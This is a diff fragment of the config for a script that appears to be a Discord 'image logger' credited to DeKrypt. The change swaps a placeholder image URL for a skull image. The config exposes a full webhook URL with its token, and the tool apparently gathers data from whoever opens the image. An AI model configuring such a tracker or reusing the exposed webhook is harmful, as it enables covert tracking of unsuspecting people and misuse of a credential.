@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1304261217518485534/s638rYduBOkIH2_aTWLtPgk6hsSswq-BPGsujPAYtdjg6YsRCCPSa5LcaRmuixgqXHP5",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "image": "https://1000logos.net/wp-content/uploads/2023/05/Skull-Emoji.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
